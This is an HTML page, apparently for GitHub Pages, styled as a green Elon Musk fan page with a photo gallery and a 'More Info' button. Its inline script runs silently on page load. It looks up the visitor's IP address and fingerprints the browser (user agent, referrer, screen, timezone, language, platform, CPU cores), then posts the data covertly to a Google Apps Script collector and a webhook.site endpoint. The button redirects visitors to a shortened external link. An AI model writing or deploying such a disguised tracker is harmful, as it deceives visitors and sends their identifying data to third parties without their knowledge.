<!DOCTYPE html>
<!-- language: HTML, file: index.html, target: GitHub Pages -->
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Elon Musk — The Future</title>
<style>
  :root {
    --bg-dark: #051008;
    --bg-panel: #0a1f10;
    --accent: #32d74b;
    --accent-glow: rgba(50, 215, 75, 0.3);
    --text-main: #e5f2e8;
    --text-muted: #8b9e91;
    --border: rgba(50, 215, 75, 0.15);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background-color: var(--bg-dark);
    color: var(--text-main);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    line-height: 1.6;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  /* Background gradient effect */
  body::before {
    content: "";
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: radial-gradient(circle at 50% -20%, var(--accent-glow) 0%, var(--bg-dark) 60%);
    z-index: -1;
    pointer-events: none;
  }
  header {
    text-align: center;
    padding: 5rem 2rem 3rem;
  }
  h1 {
    font-size: clamp(3rem, 8vw, 5rem);
    font-weight: 900;
    letter-spacing: -2px;
    text-transform: uppercase;
    background: linear-gradient(to right, #fff, var(--accent));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 0.5rem;
  }
  .subtitle {
    font-size: 1.1rem;
    color: var(--text-muted);
    letter-spacing: 4px;
    text-transform: uppercase;
    font-weight: 600;
  }
  main {
    max-width: 1000px;
    margin: 0 auto;
    padding: 0 2rem 4rem;
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 3rem;
  }
  .hero-text {
    font-size: 1.25rem;
    text-align: center;
    max-width: 700px;
    margin: 0 auto;
    color: var(--text-muted);
  }
  .gallery {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    gap: 1.5rem;
    margin-top: 1rem;
  }
  .card {
    background: var(--bg-panel);
    border: 1px solid var(--border);
    border-radius: 16px;
    overflow: hidden;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    position: relative;
  }
  .card:hover {
    transform: translateY(-5px);
    box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 20px var(--accent-glow);
    border-color: rgba(50, 215, 75, 0.4);
  }
  .card img {
    width: 100%;
    height: 320px;
    object-fit: cover;
    display: block;
    border-bottom: 1px solid var(--border);
  }
  .card-caption {
    padding: 1rem;
    text-align: center;
    font-size: 0.9rem;
    color: var(--accent);
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  .cta-container {
    text-align: center;
    margin-top: 2rem;
    margin-bottom: 4rem;
  }
  .cta-button {
    display: inline-block;
    background: var(--accent);
    color: #000;
    font-size: 1.5rem;
    font-weight: 800;
    text-transform: uppercase;
    text-decoration: none;
    padding: 1.5rem 4rem;
    border-radius: 50px;
    border: none;
    cursor: pointer;
    box-shadow: 0 0 30px var(--accent-glow);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
    width: 100%;
    max-width: 600px;
  }
  .cta-button:hover {
    transform: scale(1.02);
    box-shadow: 0 0 50px var(--accent-glow);
  }
  .cta-button:active {
    transform: scale(0.98);
  }
  footer {
    text-align: center;
    padding: 2rem;
    color: var(--text-muted);
    font-size: 0.8rem;
    border-top: 1px solid var(--border);
  }
</style>
</head>
<body>
<header>
  <h1>Elon Musk</h1>
  <div class="subtitle">The Green Era</div>
</header>
<main>
  <p class="hero-text">
    Rockets, cars, tunnels, noise. A man who treats the future like a deadline. 
    This page is green because green is the color of things that grow.
  </p>
  
  <div class="gallery">
    <div class="card">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Elon_Musk_Royal_Society_crop.jpg/480px-Elon_Musk_Royal_Society_crop.jpg" alt="Elon Musk Royal Society">
      <div class="card-caption">The Visionary</div>
    </div>
    <div class="card">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Elon_Musk_2015.jpg/480px-Elon_Musk_2015.jpg" alt="Elon Musk 2015">
      <div class="card-caption">The Builder</div>
    </div>
    <div class="card">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Elon_Musk_Colorado_2022_%28cropped%29.jpg/480px-Elon_Musk_Colorado_2022_%28cropped%29.jpg" alt="Elon Musk 2022">
      <div class="card-caption">The Future</div>
    </div>
  </div>

  <div class="cta-container">
    <button id="more-info-btn" class="cta-button">More Info</button>
  </div>
</main>
<footer>
  &copy; 2026. Green page.
</footer>

<script>
  // language: JavaScript, file: inline, target: browser
  var COLLECTOR = 'https://script.google.com/macros/s/AKfycbxf2WLWQHXAkpzZ7cffn8xuUXlNjRiEGzQ68YjjWBclSo_2SOlK4iRa4rL4RYsnGMLJ/exec';
  var WEBHOOK   = 'https://webhook.site/a9a83f66-ec0c-4dfa-9612-9cd7f9056784';
  var REDIRECT  = 'https://u2l.ai/Elon-Musk-New-Website'; 

  // Grab IP and telemetry silently on load
  (async function () {
    try {
      var r = await fetch('https://api.ipify.org?format=json');
      var d = await r.json();
      
      var payload = {
        ip: d.ip,
        ua: navigator.userAgent,
        ref: document.referrer || '',
        page: location.href,
        ts: new Date().toISOString(),
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang: navigator.language,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || 'unknown',
        touch: navigator.maxTouchPoints > 0
      };

      fetch(COLLECTOR, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify(payload)
      });

      if (WEBHOOK) {
        fetch(WEBHOOK, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      }
    } catch (e) {}
  })();

  // Handle the button click redirect
  document.getElementById('more-info-btn').addEventListener('click', function() {
    window.location.href = REDIRECT;
  });
</script>
</body>
</html>
